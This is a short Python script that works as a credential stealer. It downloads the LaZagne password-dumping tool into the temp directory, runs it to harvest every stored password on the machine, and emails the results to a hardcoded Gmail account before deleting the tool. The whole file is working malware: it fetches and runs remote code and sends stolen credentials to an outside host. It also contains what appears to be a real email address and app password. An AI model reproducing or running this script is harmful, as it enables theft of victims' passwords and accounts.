import requests
import subprocess
import smtplib as sm
import os
import tempfile as tf

sess = requests.session()

def send_mail(email,password,message):
    server = sm.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


def download(url):
    get = sess.get(url,verify=False)
    fname = url.split("/")[-1]
    with open(fname,"wb")as fh:
        fh.write(get.content)


temp_dir = tf.gettempdir()
os.chdir(temp_dir)
download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe")
result = subprocess.check_output("laZagne.exe all",shell=True)

email = "hariramsubbiah98@gmail.com"
password = "qglg rhcm zutf moau"

send_mail(email,password,result)
os.remove("lazagne.exe")